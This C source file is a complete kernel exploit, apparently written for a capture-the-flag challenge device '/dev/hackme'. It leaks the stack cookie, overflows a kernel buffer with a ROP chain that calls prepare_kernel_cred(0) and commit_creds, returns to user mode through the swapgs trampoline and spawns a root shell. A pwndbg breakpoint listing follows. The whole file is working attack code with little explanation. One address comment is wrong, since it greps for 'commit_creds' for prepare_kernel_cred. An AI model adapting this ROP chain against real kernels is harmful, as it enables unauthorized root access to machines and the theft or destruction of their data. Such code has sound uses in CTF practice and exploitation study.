#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++

typedef uint64_t u64;

u64 dev_fd;
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss;
u64 cookie;

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushfq;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_rip = (u64)&win;

    puts("[*] saved state");
}

void open_device()
{
    puts("[*] opening device");

    dev_fd = open("/dev/hackme", 2);
    if(dev_fd < 1) puts("[!] fail fd");
}

void leak_cookie()
{
    u64 leak[20];

    read(dev_fd, leak, 20 * 8);
    cookie = leak[16];

    printf("[*] cookie: %lx\n", cookie);
}

void overflow()
{
    puts("[*] overflowing");

    u64 pop_rdi = 0xffffffff815d9c47; // 0xffffffff815d9c47: pop rdi; xor al, 0x76; ret;
    u64 trampoline = 0xffffffff81200f26; // cat /proc/kallsyms | grep "swapgs_restore_regs_and_return_to_usermode"
    u64 commit_creds = 0xffffffff814c6410; // cat /proc/kallsyms | grep "commit_creds"
    u64 prepare_kernel_cred = 0xffffffff814c67f0; // cat /proc/kallsyms | grep "commit_creds"
    u64 mov_rdi_rax = 0xffffffff8100aedf; // 0xffffffff8100aedf: mov rdi, rax; rep movsq [rdi], [rsi]; pop rbp; ret;
    u64 pop_rcx_dec_ecx = 0xffffffff819c7e59; // 0xffffffff819c7e59: pop rcx; dec ecx; ret;

    u64 rop[50];
    u64 idx = 16;
    rop[inc] = cookie;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = pop_rdi;
    rop[inc] = 0;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = pop_rcx_dec_ecx;
    rop[inc] = 1;
    rop[inc] = mov_rdi_rax;
    rop[inc] = 0; // rbp
    rop[inc] = commit_creds;
    rop[inc] = trampoline;
    rop[inc] = 0; // rax
    rop[inc] = 0; // rdi
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;

    // bof
    write(dev_fd, (char *)&rop, sizeof(rop));


    puts("[!] should never be reached");
}

int main()
{
    save_state();
    open_device();
    leak_cookie();
    overflow();

    puts("[!] should never be reached");
}

/*
pwndbg> info b
Num     Type           Disp Enb Address            What
2       breakpoint     keep y   0xffffffffc000006a
        breakpoint already hit 1 time
4       breakpoint     keep y   0xffffffffc00000f6
        breakpoint already hit 1 time
pwndbg>
*/